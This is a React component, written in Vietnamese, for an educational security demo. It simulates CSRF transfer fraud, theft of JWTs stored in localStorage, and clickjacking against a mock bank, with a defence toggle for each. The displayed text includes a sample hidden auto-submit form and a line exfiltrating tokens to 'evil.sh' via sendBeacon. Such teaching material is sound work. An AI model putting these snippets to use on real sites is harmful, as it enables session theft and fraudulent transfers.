'use client';

import * as React from 'react';
import {
  Cpu,
  Gift,
  HardDrive,
  KeyRound,
  Landmark,
  Lock,
  MousePointerClick,
  RotateCcw,
  ShieldCheck,
  Skull,
} from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card } from '@/components/ui/card';
import { Input } from '@/components/ui/input';

/**
 * FIRING RANGE · identity-session-heist
 * Chuỗi đánh cắp danh tính: CSRF mượn tay nạn nhân để chuyển tiền qua cookie
 * SameSite=None, JWT nằm trong localStorage chờ một XSS nhỏ đọc lấy, và một
 * iframe trong suốt đủ lừa cú click chuyển khoản. Bật Defense để thấy SameSite
 * Strict + HttpOnly cookie + X-Frame-Options DENY đứt từng mắt xích.
 */

type Tone = 'info' | 'ok' | 'bad' | 'warn';

interface LogLine {
  id: number;
  text: string;
  tone: Tone;
}

type TabId = 'csrf' | 'token' | 'jack';
type TokenStore = 'local' | 'memory' | 'httponly';

const TABS: Array<{ id: TabId; label: string; icon: React.ReactNode }> = [
  { id: 'csrf', label: 'CSRF Transfer Fraud', icon: <Landmark className="h-3.5 w-3.5" /> },
  { id: 'token', label: 'JWT Heist · Storage', icon: <KeyRound className="h-3.5 w-3.5" /> },
  { id: 'jack', label: 'Clickjacking', icon: <MousePointerClick className="h-3.5 w-3.5" /> },
];

const LOOT_TEXT = [
  '{',
  `  "at": "eyJhbGciOiJIUzI1NiJ9.<payload>.<sig>",`,
  `  "rt": "rt_live_9f2a…(refresh 30 ngày, không rotation)"`,
  '}',
  '→ sendBeacon("https://evil.sh/loot") · 200 OK',
].join('\n');

/** Định dạng tiền tệ thủ công để SSR/client luôn khớp từng ký tự */
function fmtVnd(n: number): string {
  return `${n.toString().replace(/\B(?=(\d{3})+(?!\d))/g, '.')}₫`;
}

export function SessionHeistRange() {
  // ── Công tắc phòng thủ (mỗi vector một lớp) ───────────────────────────────
  const [sameSiteStrict, setSameSiteStrict] = React.useState(false);
  const [tokenStore, setTokenStore] = React.useState<TokenStore>('local');
  const [xfoDeny, setXfoDeny] = React.useState(false);
  const allDefenses = sameSiteStrict && xfoDeny && tokenStore === 'httponly';

  // ── Công tắc phía attacker ────────────────────────────────────────────────
  const [formArmed, setFormArmed] = React.useState(true);
  const [overlayOn, setOverlayOn] = React.useState(false);

  // ── Mock ngân hàng ────────────────────────────────────────────────────────
  const [balance, setBalance] = React.useState(50000000);
  const [recipient, setRecipient] = React.useState('attacker-account');
  const [amount, setAmount] = React.useState('5000000');

  // ── Kết quả theo vector ───────────────────────────────────────────────────
  const [csrfHit, setCsrfHit] = React.useState(false);
  const [tokenHit, setTokenHit] = React.useState(false);
  const [jackHit, setJackHit] = React.useState(false);
  const [csrfLogs, setCsrfLogs] = React.useState<LogLine[]>([]);
  const [tokenLogs, setTokenLogs] = React.useState<LogLine[]>([]);
  const [jackLogs, setJackLogs] = React.useState<LogLine[]>([]);
  const [activeTab, setActiveTab] = React.useState<TabId>('csrf');
  const [lootRevealed, setLootRevealed] = React.useState(false);

  const logIdRef = React.useRef(0);
  const makeLines = (entries: Array<[string, Tone]>): LogLine[] =>
    entries.map(([text, tone]) => ({ id: ++logIdRef.current, text, tone }));

  const append = (
    setter: React.Dispatch<React.SetStateAction<LogLine[]>>,
    entries: Array<[string, Tone]>
  ) => setter((prev) => [...prev, ...makeLines(entries)].slice(-8));

  const parseAmount = () => {
    const parsed = parseInt(amount.replace(/\D/g, ''), 10);
    return Number.isFinite(parsed) ? parsed : 0;
  };
  const debit = () => setBalance((b) => Math.max(0, b - parseAmount()));

  const legitTransfer = () => {
    if (parseAmount() <= 0) return;
    debit();
    append(setCsrfLogs, [
      [`$ POST /api/users/transfer {to:'${recipient || '…'}', amount:${fmtVnd(parseAmount())}}`, 'info'],
      ['200 OK — người dùng TỰ thao tác trên mybank.com ✅', 'ok'],
    ]);
  };

  const fireForgedVisit = () => {
    if (!formArmed) {
      append(setCsrfLogs, [
        ['$ victim mở https://quiz-vui.example …', 'info'],
        ['chỉ là quiz vui — không có form ẩn nào được submit', 'ok'],
      ]);
      return;
    }
    if (sameSiteStrict) {
      append(setCsrfLogs, [
        ['$ victim mở https://quiz-vui.example …', 'info'],
        ['hidden form auto-submit → POST cross-site tới /api/users/transfer', 'info'],
        ['Cookie SameSite=Strict: browser KHÔNG đính kèm session cho cross-site POST', 'ok'],
        ['server: 403 Blocked — request vô danh, tiền an toàn ✅', 'ok'],
      ]);
      return;
    }
    debit();
    setCsrfHit(true);
    append(setCsrfLogs, [
      ['$ victim mở https://quiz-vui.example …', 'info'],
      ['body onload → document.forms[0].submit()', 'bad'],
      ['browser gắn cookie session (SameSite=None) vào request cross-site', 'bad'],
      [`POST /api/users/transfer {to:'${recipient || 'attacker'}', amount:${fmtVnd(parseAmount())}}`, 'bad'],
      ['200 OK — tiền đã rời tài khoản, nạn nhân KHÔNG hay biết 💀', 'bad'],
    ]);
  };

  const selectStorage = (store: TokenStore) => {
    setTokenStore(store);
    if (store !== 'local') setLootRevealed(false);
  };

  const runTheftScript = () => {
    if (tokenStore === 'local') {
      setLootRevealed(true);
      setTokenHit(true);
      append(setTokenLogs, [
        ["$ scanning window.localStorage …", 'info'],
        ["found keys: ['accessToken','refreshToken','user-profile']", 'bad'],
        ["getItem('accessToken') ✔ · getItem('refreshToken') ✔", 'bad'],
        ['exfiltrating to https://evil.sh/loot → 200 OK 💀', 'bad'],
        ['CRITICAL: logout cũng vô ích — refresh token sống thêm 30 ngày', 'bad'],
      ]);
      return;
    }
    if (tokenStore === 'memory') {
      setLootRevealed(false);
      append(setTokenLogs, [
        ["$ scanning window.localStorage …", 'info'],
        ['localStorage trống trơn — không có gì để quét', 'ok'],
        ['script đọc được accessToken trong RAM (biến React context)', 'warn'],
        ['NHƯNG mất ngay khi F5 · refresh token KHÔNG nằm đây → không giữ phiên dài hạn', 'warn'],
      ]);
      return;
    }
    setLootRevealed(false);
    append(setTokenLogs, [
      ["$ scanning window.localStorage …", 'info'],
      ["script gọi document.cookie → chuỗi RỖNG", 'ok'],
      ['HttpOnly: JS KHÔNG THỂ đọc cookie phiên — theft thất bại ✅', 'ok'],
      ['frontend chỉ gọi /api/auth/* — token chưa bao giờ chạm tay JS client', 'ok'],
    ]);
  };

  const realWalletClick = () => {
    debit();
    append(setJackLogs, [
      ['$ user bấm nút "Chuyển tiền" trên mybank.com/wallet', 'info'],
      [`POST /api/users/transfer ${fmtVnd(parseAmount())} → 200 OK (thao tác chính chủ ✅)`, 'ok'],
    ]);
  };

  const fireDecoyClick = () => {
    debit();
    setJackHit(true);
    append(setJackLogs, [
      ['$ user bấm nút "🎁 Nhận quà" trên quiz-vui.example', 'info'],
      ['click đi XUYÊN iframe trong suốt (opacity .001) xuống nút bên dưới', 'bad'],
      [`nút thật bên dưới: Chuyển tiền ${fmtVnd(parseAmount())} → attacker`, 'bad'],
      ['200 OK — clickjacking thành công, không cần XSS, không cần password 💀', 'bad'],
    ]);
  };

  const resetRange = () => {
    setSameSiteStrict(false);
    setTokenStore('local');
    setXfoDeny(false);
    setFormArmed(true);
    setOverlayOn(false);
    setBalance(50000000);
    setRecipient('attacker-account');
    setAmount('5000000');
    setCsrfHit(false);
    setTokenHit(false);
    setJackHit(false);
    setCsrfLogs([]);
    setTokenLogs([]);
    setJackLogs([]);
    setLootRevealed(false);
  };

  const hitCount = (csrfHit ? 1 : 0) + (tokenHit ? 1 : 0) + (jackHit ? 1 : 0);

  const renderLogBox = (logs: LogLine[]) =>
    logs.length > 0 ? (
      <div className="rounded-lg bg-black/40 p-2.5 font-mono text-[11px] leading-relaxed">
        {logs.map((line) => (
          <div
            key={line.id}
            className={
              line.tone === 'bad'
                ? 'text-red-400'
                : line.tone === 'ok'
                  ? 'text-emerald-400'
                  : line.tone === 'warn'
                    ? 'text-amber-400'
                    : 'text-slate-500'
            }
          >
            {line.text}
          </div>
        ))}
      </div>
    ) : null;

  return (
    <div className="space-y-4">
      {/* Control bar */}
      <div className="flex flex-wrap items-center justify-between gap-2">
        <div className="flex items-center gap-2">
          {allDefenses ? (
            <Badge variant="success" className="gap-1 text-[10px]">
              <ShieldCheck className="h-3 w-3" />
              DEFENSE ON
            </Badge>
          ) : (
            <Badge variant="destructive" className="gap-1 text-[10px]">
              <Skull className="h-3 w-3" />
              ATTACK MODE
            </Badge>
          )}
          <span className="font-mono text-[10px] uppercase tracking-wider text-muted-foreground">
            đã ghi nhận {hitCount}/3 vụ đánh cắp · số dư {fmtVnd(balance)}
          </span>
        </div>
        <div className="flex gap-2">
          <Button
            size="sm"
            variant={allDefenses ? 'ghost' : 'destructive'}
            onClick={() => {
              setSameSiteStrict(false);
              setTokenStore('local');
              setXfoDeny(false);
            }}
            className="h-7 text-[11px]"
          >
            <Skull className="mr-1 h-3 w-3" />
            Mở cửa tấn công
          </Button>
          <Button
            size="sm"
            variant={allDefenses ? 'default' : 'ghost'}
            onClick={() => {
              setSameSiteStrict(true);
              setTokenStore('httponly');
              setXfoDeny(true);
            }}
            className="h-7 text-[11px]"
          >
            <ShieldCheck className="mr-1 h-3 w-3" />
            Phòng thủ tối đa
          </Button>
          <Button size="sm" variant="ghost" onClick={resetRange} className="h-7 px-2 text-[11px]">
            <RotateCcw className="mr-1 h-3 w-3" />
            Reset
          </Button>
        </div>
      </div>

      {/* Tab-like switcher */}
      <div className="flex w-fit gap-1 rounded-xl border border-border/80 bg-card p-1">
        {TABS.map((tab) => (
          <button
            key={tab.id}
            type="button"
            onClick={() => setActiveTab(tab.id)}
            className={`flex items-center gap-1.5 rounded-lg px-3 py-1.5 text-[11px] font-semibold transition-colors ${
              activeTab === tab.id
                ? 'bg-slate-800 text-slate-100 shadow-inner'
                : 'text-muted-foreground hover:bg-accent hover:text-accent-foreground'
            }`}
          >
            {tab.icon}
            {tab.label}
          </button>
        ))}
      </div>

      {/* ── CSRF mini-range ── */}
      {activeTab === 'csrf' && (
        <div className="grid gap-3 lg:grid-cols-2">
          {/* Ngân hàng */}
          <div className="space-y-2 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
            <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
              <span>$ mybank.com/wallet — trang thật</span>
              <Badge
                variant={sameSiteStrict ? 'success' : 'destructive'}
                className="cursor-pointer text-[9px]"
                onClick={() => setSameSiteStrict((v) => !v)}
              >
                cookie SameSite: {sameSiteStrict ? 'Strict' : 'None'}
              </Badge>
            </div>
            <p className="font-mono text-lg font-bold text-emerald-400">{fmtVnd(balance)}</p>
            <Input
              value={recipient}
              onChange={(e) => setRecipient(e.target.value)}
              placeholder="Người nhận"
              className="h-8 border-slate-700 bg-slate-900/70 font-mono text-[11px] text-slate-200"
            />
            <Input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              inputMode="numeric"
              placeholder="Số tiền (₫)"
              className="h-8 border-slate-700 bg-slate-900/70 font-mono text-[11px] text-slate-200"
            />
            <Button size="sm" onClick={legitTransfer} className="h-8 w-full text-[11px]">
              Chuyển tiền (người dùng tự bấm)
            </Button>
            {renderLogBox(csrfLogs)}
          </div>

          {/* Trang attacker */}
          <div className="space-y-2 rounded-xl border border-red-500/25 bg-red-950/20 p-3 shadow-inner">
            <div className="flex items-center justify-between font-mono text-[11px] text-slate-500">
              <span>$ open https://quiz-vui.example</span>
              <button
                type="button"
                onClick={() => setFormArmed((v) => !v)}
                disabled={sameSiteStrict}
                title={
                  sameSiteStrict
                    ? 'SameSite=Strict đã vô hiệu hóa form — không cần gỡ'
                    : 'Bật/tắt form ẩn auto-submit'
                }
                className={`rounded-md border px-2 py-0.5 font-mono text-[9px] uppercase tracking-wider transition-colors ${
                  formArmed && !sameSiteStrict
                    ? 'animate-pulse border-red-500/40 bg-red-500/15 text-red-300'
                    : 'border-slate-700 text-slate-500 hover:bg-slate-800'
                }`}
              >
                hidden form: {formArmed && !sameSiteStrict ? 'ARMED' : 'disarmed'}
              </button>
            </div>
            <div className="rounded-lg border border-slate-800 bg-black/40 p-2.5 font-mono text-[10px] leading-relaxed text-slate-400">
              {'<form action="https://mybank.com/api/users/transfer" method="POST" style="display:none">'}
              <br />
              {`  <input name="to" value="${recipient || 'attacker-account'}" />`}
              <br />
              {`  <input name="amount" value="${fmtVnd(parseAmount())}" />`}
              <br />
              {'</form> // onload → submit() ngay khi trang mở'}
            </div>
            <Button
              size="sm"
              variant="destructive"
              onClick={fireForgedVisit}
              className="h-8 w-full text-[11px]"
            >
              🕵️ Gửi nạn nhân link &quot;quiz vui&quot;
            </Button>
            <p className="font-mono text-[10px] text-slate-600">
              {sameSiteStrict
                ? '// Strict: cookie không đi cùng POST cross-site — server nhìn thấy request vô danh'
                : '// None: trình duyệt TỰ gắn cookie hợp lệ cho mọi request tới mybank.com'}
            </p>
          </div>
        </div>
      )}

      {/* ── Token storage mini-range ── */}
      {activeTab === 'token' && (
        <div className="space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
          <div className="flex flex-wrap items-center justify-between gap-2 font-mono text-[11px] text-slate-500">
            <span>$ DevTools → Application → Storage</span>
            <div className="flex gap-1.5">
              {(
                [
                  { id: 'local' as const, label: 'localStorage', icon: <HardDrive className="h-3 w-3" /> },
                  { id: 'memory' as const, label: 'Memory (RAM)', icon: <Cpu className="h-3 w-3" /> },
                  { id: 'httponly' as const, label: 'HttpOnly Cookie', icon: <Lock className="h-3 w-3" /> },
                ]
              ).map((opt) => (
                <Button
                  key={opt.id}
                  size="sm"
                  variant={tokenStore === opt.id ? 'default' : 'outline'}
                  onClick={() => selectStorage(opt.id)}
                  className="h-7 gap-1 px-2 text-[10px]"
                >
                  {opt.icon}
                  {opt.label}
                </Button>
              ))}
            </div>
          </div>

          <div className="rounded-lg bg-black/40 p-2.5 font-mono text-[11px] leading-relaxed">
            {tokenStore === 'local' ? (
              <>
                <p className="text-slate-400">window.localStorage</p>
                <p className="text-amber-300">accessToken: &quot;eyJhbGciOiJIUzI1NiJ9.payload.sig&quot;</p>
                <p className="text-amber-300">refreshToken: &quot;rt_live_9f2a…&quot;</p>
                <p className="mt-1 text-red-400">{'// không có thuộc tính bảo vệ nào — mọi JS cùng origin đọc được'}</p>
              </>
            ) : tokenStore === 'memory' ? (
              <>
                <p className="text-slate-400">AppMemory (React context)</p>
                <p className="text-slate-300">accessToken: &quot;eyJ…&quot; // biến RAM, mất khi F5</p>
                <p className="mt-1 text-emerald-500">{'// refresh token KHÔNG nằm ở client'}</p>
              </>
            ) : (
              <>
                <p className="text-slate-400">document.cookie → &quot;&quot;</p>
                <p className="text-emerald-400">Set-Cookie: access_token=…; HttpOnly; Secure; SameSite=Lax</p>
                <p className="mt-1 text-emerald-500">{'// HttpOnly ẨN cookie khỏi mọi đoạn JavaScript'}</p>
              </>
            )}
          </div>

          <Button
            size="sm"
            variant="destructive"
            onClick={runTheftScript}
            className="h-8 text-[11px]"
          >
            🦠 Chạy script trộm token (giả lập XSS)
          </Button>

          {lootRevealed && (
            <div className="rounded-lg border border-red-500/40 bg-red-500/10 p-2.5">
              <p className="mb-1 font-mono text-[10px] font-bold uppercase tracking-wider text-red-300">
                📦 Gói hàng bị chặn tại evil.sh
              </p>
              <pre className="whitespace-pre-wrap break-all font-mono text-[10px] leading-relaxed text-red-300">{LOOT_TEXT}</pre>
              <p className="mt-1 text-[10px] text-red-400/80">
                Attacker đăng nhập AS VICTIM từ bất cứ đâu — đổi mật khẩu cũng chưa đủ nếu thiếu revoke.
              </p>
            </div>
          )}

          {renderLogBox(tokenLogs)}
        </div>
      )}

      {/* ── Clickjacking mini-range ── */}
      {activeTab === 'jack' && (
        <div className="space-y-3 rounded-xl border border-slate-800 bg-slate-950 p-3 shadow-inner">
          <div className="flex flex-wrap items-center justify-between gap-2 font-mono text-[11px] text-slate-500">
            <span>$ kịch bản: trang attacker chồng iframe trong suốt lên nút chuyển tiền</span>
            <div className="flex gap-1.5">
              <Button
                size="sm"
                variant={overlayOn ? 'destructive' : 'outline'}
                onClick={() => setOverlayOn((v) => !v)}
                className="h-7 px-2 text-[10px]"
              >
                overlay attacker: {overlayOn ? 'ON' : 'OFF'}
              </Button>
              <Button
                size="sm"
                variant={xfoDeny ? 'default' : 'outline'}
                onClick={() => setXfoDeny((v) => !v)}
                className="h-7 px-2 text-[10px]"
              >
                X-Frame-Options: {xfoDeny ? 'DENY' : '(none)'}
              </Button>
            </div>
          </div>

          {/* Trang nạn nhân + overlay */}
          <div className="relative overflow-hidden rounded-lg border border-slate-800 bg-gradient-to-br from-slate-900 to-slate-950 p-4">
            <p className="font-mono text-[11px] font-bold text-slate-300">MyBank · Ví của bạn</p>
            <p className="mt-1 text-[11px] text-muted-foreground">
              Số dư: <span className="font-mono font-bold text-emerald-400">{fmtVnd(balance)}</span> — xác nhận lệnh chuyển bên dưới.
            </p>
            <div className="mt-6 flex justify-end">
              <Button size="sm" onClick={realWalletClick} className="h-9 text-[11px]">
                💸 Chuyển tiền
              </Button>
            </div>

            {overlayOn && !xfoDeny && (
              <div className="pointer-events-none absolute inset-0 z-20 border-2 border-dashed border-sky-500/40 bg-sky-500/[0.04]">
                <span className="pointer-events-none absolute left-2 top-1.5 font-mono text-[9px] uppercase tracking-wider text-sky-400/70">
                  iframe transparent · opacity: .001 · z-index: 9999
                </span>
                <span className="absolute bottom-3 right-3 z-30 block cursor-pointer animate-pulse">
                  <Button
                    size="sm"
                    variant="glass"
                    className="pointer-events-auto h-10 border-amber-400/40 text-[12px] font-bold text-amber-300 shadow-xl"
                    onClick={fireDecoyClick}
                  >
                    <Gift className="mr-1 h-3.5 w-3.5" />
                    🎁 Trúng iPhone — BẤM ĐỂ NHẬN
                  </Button>
                </span>
              </div>
            )}

            {overlayOn && xfoDeny && (
              <div className="absolute inset-0 z-20 flex flex-col items-center justify-center gap-1 bg-red-950/70 backdrop-blur-[1px]">
                <ShieldCheck className="h-5 w-5 text-emerald-400" />
                <p className="font-mono text-[11px] font-bold text-emerald-300">
                  Refused to connect — X-Frame-Options: DENY
                </p>
                <p className="font-mono text-[10px] text-emerald-400/70">
                  browser từ chối render frame của attacker → overlay trắng tay
                </p>
              </div>
            )}
          </div>

          {renderLogBox(jackLogs)}
          <p className="font-mono text-[10px] text-slate-600">
            {overlayOn
              ? '// nút quà tặng nằm CHÍNH XÁC trên nút Chuyển tiền — click rơi xuống nút thật bên dưới'
              : '// bật overlay attacker để dựng lớp bẫy, rồi thử bấm nút quà tặng'}
          </p>
        </div>
      )}

      {/* Per-vector report */}
      <div className="space-y-2">
        {(
          [
            {
              key: 'csrf' as const,
              icon: <Landmark className="h-3.5 w-3.5" />,
              label: 'CSRF Transfer Fraud',
              patched: sameSiteStrict,
              hit: csrfHit,
              hitNote: 'Request forged mang cookie hợp lệ của nạn nhân — giao dịch thành công dưới danh nghĩa người thật.',
              patchNote: 'SameSite=Strict chặn cookie trên POST cross-site; server kiểm tra Origin + CSRF token để tự vệ độc lập.',
            },
            {
              key: 'token' as const,
              icon: <KeyRound className="h-3.5 w-3.5" />,
              label: 'JWT Heist từ localStorage',
              patched: tokenStore === 'httponly',
              hit: tokenHit,
              hitNote: 'Cặp access+refresh token bị exfiltrate — backdoor 30 ngày sống sót qua cả logout.',
              patchNote: 'Token nằm trong HttpOnly cookie ngoài tầm với của JavaScript; access ngắn hạn trong RAM, refresh kèm rotation.',
            },
            {
              key: 'jack' as const,
              icon: <MousePointerClick className="h-3.5 w-3.5" />,
              label: 'Clickjacking qua iframe trong suốt',
              patched: xfoDeny,
              hit: jackHit,
              hitNote: 'Một cú click "nhận quà" trở thành lệnh chuyển tiền — không XSS, không password, không cảnh báo.',
              patchNote: 'X-Frame-Options: DENY (hoặc CSP frame-ancestors) khiến browser từ chối nhúng trang vào iframe bẫy.',
            },
          ] as Array<{
            key: TabId;
            icon: React.ReactNode;
            label: string;
            patched: boolean;
            hit: boolean;
            hitNote: string;
            patchNote: string;
          }>
        ).map((vector) => {
          const showHit = vector.hit && !vector.patched;
          return (
            <Card
              key={vector.key}
              className={`glass-card flex items-start gap-3 p-3 ${
                showHit ? 'border-destructive/30' : vector.patched ? 'border-emerald-500/20' : ''
              }`}
            >
              <span
                className={`mt-0.5 flex h-7 w-7 shrink-0 items-center justify-center rounded-lg ${
                  showHit
                    ? 'bg-destructive/10 text-destructive'
                    : vector.patched
                      ? 'bg-emerald-500/10 text-emerald-500'
                      : 'bg-secondary text-muted-foreground'
                }`}
              >
                {showHit ? <Skull className="h-3.5 w-3.5" /> : vector.patched ? <ShieldCheck className="h-3.5 w-3.5" /> : vector.icon}
              </span>
              <div className="min-w-0 space-y-0.5">
                <p className="text-xs font-bold text-foreground">{vector.label}</p>
                {showHit && <p className="text-[11px] leading-relaxed text-destructive">{vector.hitNote}</p>}
                {vector.patched && (
                  <p className="text-[11px] leading-relaxed text-emerald-600 dark:text-emerald-400">{vector.patchNote}</p>
                )}
                {!showHit && !vector.patched && (
                  <p className="text-[11px] leading-relaxed text-muted-foreground">
                    Chưa khai hoả — kích hoạt vector này ở ATTACK MODE để xem Blast Radius.
                  </p>
                )}
              </div>
            </Card>
          );
        })}
      </div>

      {/* Verdict */}
      {(hitCount > 0 || allDefenses) && (
        <Card className={`glass-card p-4 ${allDefenses ? 'border-emerald-500/30' : 'border-destructive/30'}`}>
          {hitCount > 0 && !allDefenses ? (
            <p className="text-xs leading-relaxed text-foreground">
              💀 <span className="font-bold">Blast Radius:</span> tiền rời tài khoản bằng chính
              cookie của nạn nhân, cặp JWT nằm gọn trong localStorage chờ một XSS nhỏ khai quật,
              và một cú click vô hại đủ ký lệnh chuyển khoản — toàn bộ chuỗi không cần password và
              không kích hoạt bất kỳ alarm nào.
            </p>
          ) : (
            <p className="text-xs leading-relaxed text-foreground">
              🛡️{' '}
              <span className="font-bold text-emerald-600 dark:text-emerald-400">Defense Patch:</span>{' '}
              SameSite=Strict cắt cookie khỏi mọi POST cross-site, token sống trong HttpOnly cookie
              ngoài tầm với của script, X-Frame-Options: DENY khiến iframe bẫy trắng tay — chuỗi
              đánh cắp danh tính đứt từng mắt xích.
            </p>
          )}
        </Card>
      )}
    </div>
  );
}
